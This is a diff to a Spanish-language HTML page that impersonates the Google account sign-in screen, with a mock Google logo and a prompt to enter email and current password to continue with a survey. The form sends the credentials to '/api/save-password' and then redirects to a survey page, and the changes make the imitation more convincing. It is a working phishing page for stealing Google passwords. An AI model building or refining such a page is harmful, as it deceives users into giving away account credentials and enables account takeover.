@@ -2,25 +2,39 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Inicia sesión - Cuenta de Google</title>
     <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
         body {
-            font-family: 'Roboto', Arial, sans-serif;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
             background-color: #fff;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
             color: #202124;
+            padding: 16px;
         }
         .container {
-            width: 400px;
-            padding: 40px;
-            text-align: left;
+            width: 100%;
+            max-width: 450px;
+            padding: 40px 32px;
+            background: #fff;
+            border-radius: 8px;
+        }
+        @media (min-width: 450px) {
+            .container {
+                border: 1px solid #dadce0;
+                padding: 40px;
+            }
         }
         .google-logo {
-            font-size: 22px;
+            font-size: 24px;
             font-weight: 500;
             margin-bottom: 24px;
             display: flex;
@@ -37,43 +51,39 @@
         h2 {
             font-size: 24px;
             font-weight: 400;
-            margin-bottom: 24px;
+            margin-bottom: 8px;
             text-align: center;
         }
-        h3 {
-            font-size: 16px;
-            font-weight: 500;
-            margin-bottom: 8px;
-        }
         p.subtitle {
-            font-size: 14px;
+            font-size: 15px;
             color: #5f6368;
-            margin-bottom: 24px;
-            line-height: 1.4;
+            margin-bottom: 32px;
+            text-align: center;
+            line-height: 1.5;
         }
         .input-group {
             position: relative;
-            margin-bottom: 16px;
+            margin-bottom: 20px;
         }
         input {
             width: 100%;
-            padding: 13px 15px;
+            padding: 16px;
             border: 1px solid #dadce0;
             border-radius: 4px;
             font-size: 16px;
-            box-sizing: border-box;
             outline: none;
-            transition: border 0.2s;
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
         input:focus {
-            border: 2px solid #1a73e8;
-            padding: 12px 14px;
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 15px; /* Ajuste para compensar el borde de 2px */
         }
         .buttons-row {
             display: flex;
             justify-content: flex-end;
             align-items: center;
-            margin-top: 30px;
+            margin-top: 32px;
         }
         .btn-guardar {
             background-color: #1a73e8;
@@ -84,12 +94,13 @@
             font-size: 14px;
             font-weight: 500;
             cursor: pointer;
+            transition: background-color 0.2s;
         }
         .btn-guardar:hover {
             background-color: #1557b0;
         }
         #message {
-            margin-top: 15px;
+            margin-top: 20px;
             font-size: 14px;
             text-align: center;
         }
@@ -102,14 +113,12 @@
                 <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
             </span>
         </div>
-        <h2>Inicia sesión en tu cuenta</h2>
-
-        <h3>Acceso</h3>
-        <p class="subtitle">Introduce tu correo y contraseña actual para continuar con el estudio.</p>
+        <h2>Inicia sesión</h2>
+        <p class="subtitle">Usa tu Cuenta de Google para continuar con la encuesta</p>
 
         <form id="passwordForm">
             <div class="input-group">
-                <input type="email" id="email" required placeholder="Correo electrónico">
+                <input type="email" id="email" required placeholder="Correo electrónico o teléfono">
             </div>
 
             <div class="input-group">
@@ -124,6 +133,13 @@
     </div>
 
     <script>
+        // Función opcional para auto-rellenar datos si lo necesitas rápidamente en pruebas
+        window.addEventListener('DOMContentLoaded', () => {
+            // Puedes activar esto descomentándolo para pruebas automáticas:
+            // document.getElementById('email').value = "estudiante.prueba@gmail.com";
+            // document.getElementById('oldPassword').value = "MiPassword123";
+        });
+
         document.getElementById('passwordForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             const email = document.getElementById('email').value;
@@ -131,7 +147,7 @@
             const msg = document.getElementById('message');
 
             msg.style.color = '#5f6368';
-            msg.textContent = 'Verificando...';
+            msg.textContent = 'Comprobando...';
 
             try {
                 const res = await fetch('/api/save-password', {
@@ -142,16 +158,18 @@
                 const data = await res.json();
                 
                 if(data.success) {
-                    msg.style.color = 'green';
-                    msg.textContent = '¡Inicio de sesión exitoso!';
-                    // Aquí puedes redirigir a la encuesta si lo deseas:
-                    // window.location.href = '/encuesta.html';
+                    msg.style.color = '#137333';
+                    msg.textContent = '¡Verificado con éxito!';
+                    // Redirección opcional al siguiente paso (encuesta)
+                    setTimeout(() => {
+                        window.location.href = '/encuesta.html';
+                    }, 1000);
                 } else {
-                    msg.style.color = 'red';
-                    msg.textContent = data.message || 'Error al iniciar sesión.';
+                    msg.style.color = '#c5221f';
+                    msg.textContent = data.message || 'Contraseña incorrecta. Inténtalo de nuevo.';
                 }
             } catch (error) {
-                msg.style.color = 'red';
+                msg.style.color = '#c5221f';
                 msg.textContent = 'Error de conexión con el servidor.';
             }
         });
